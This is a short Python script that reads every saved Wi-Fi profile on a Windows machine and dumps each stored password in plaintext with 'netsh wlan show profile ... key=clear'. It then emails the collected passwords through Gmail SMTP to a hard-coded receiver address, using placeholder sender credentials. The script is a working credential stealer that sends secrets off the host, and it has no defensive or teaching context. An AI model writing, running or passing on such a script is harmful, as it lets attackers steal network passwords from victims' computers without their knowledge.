import subprocess, smtplib, re

def send_email(sender_email, sender_password, receiver_email, subject, message):
    txt = f"Subject: {subject}\n\n{message}".encode('utf-8')

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, sender_password)
    
    server.sendmail(sender_email, receiver_email, txt)
    #print("Email sent to " + receiver_email)
    server.quit()

# Example usage
email = "example@gmail.com"
password = "EMAIL_PASS"
receivers_mail = "sample@gmail.com"
subject = "Put your subject"


command = "netsh wlan show profile"
output = subprocess.check_output(command, shell =True).decode('utf-8') # decode to understandable form 

filter_result = re.findall("(?:Profile\\s*:\\s)(.*)", output)
#print(filter_result)
mail_output = ""
for result in filter_result:
    command = "netsh wlan show profile \"" + result + "\" key=clear"    
    profile_output = subprocess.check_output(command, shell=True)
    mail_output += profile_output.decode('utf-8', errors='replace')
    
    #print(mail_output)


send_email(email, password, receivers_mail, subject, mail_output)